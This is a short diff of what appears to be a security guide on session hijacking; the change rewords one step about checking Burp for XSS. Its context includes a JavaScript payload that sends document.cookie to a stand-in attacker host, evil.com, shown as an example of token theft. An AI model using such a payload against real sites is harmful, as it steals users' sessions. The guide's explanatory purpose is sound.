@@ -88,7 +88,7 @@ Session hijacking is the exploitation of a valid session token to gain unauthori
 1. Check if session cookies have the `HttpOnly` flag:
    - Use `curl` with pattern `Set-Cookie:.*session.*HttpOnly` to verify
    - If `HttpOnly` is missing, the token is accessible via `document.cookie` in JavaScript
-2. Use `nuclei` to check if Burp has identified any XSS vulnerabilities
+2. check if Burp has identified any XSS vulnerabilities
 3. If XSS exists and `HttpOnly` is missing, the attacker can steal tokens with:
    ``javascript
    document.location='https://evil.com/steal?c='+document.cookie
